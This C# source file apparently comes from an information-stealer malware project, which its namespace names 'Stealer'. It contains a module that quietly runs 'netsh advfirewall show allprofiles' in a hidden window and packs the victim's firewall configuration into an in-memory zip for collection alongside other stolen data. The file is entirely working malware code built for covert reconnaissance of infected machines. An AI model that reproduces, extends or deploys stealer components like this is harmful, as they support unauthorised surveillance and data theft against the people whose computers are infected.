using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Diagnostics;
using System.Text;

namespace IntelXPro.src.IntelXPro.Stealer.Network
{
    internal class FirewallStatus : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var networkApp = new Counter.CounterApplications { Name = "Firewall Status" };
                StringBuilder sb = new StringBuilder();
                
                sb.AppendLine("[Firewall Status]");
                sb.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                sb.AppendLine();
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netsh";
                    process.StartInfo.Arguments = "advfirewall show allprofiles";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                string targetPath = "Network\\firewall_status.txt";
                zip.AddTextFile(targetPath, sb.ToString());
                networkApp.Files.Add(targetPath);
                
                if (networkApp.Files.Count > 0)
                {
                    counter.Applications.Add(networkApp);
                }
            }
            catch (Exception ex)
            {
                var networkApp = new Counter.CounterApplications { Name = "Firewall Status" };
                StringBuilder errorSb = new StringBuilder();
                errorSb.AppendLine("[Firewall Status]");
                errorSb.AppendLine($"Error collecting firewall info: {ex.Message}");
                
                string targetPath = "Network\\firewall_status.txt";
                zip.AddTextFile(targetPath, errorSb.ToString());
                networkApp.Files.Add(targetPath);
                counter.Applications.Add(networkApp);
            }
        }
    }
}
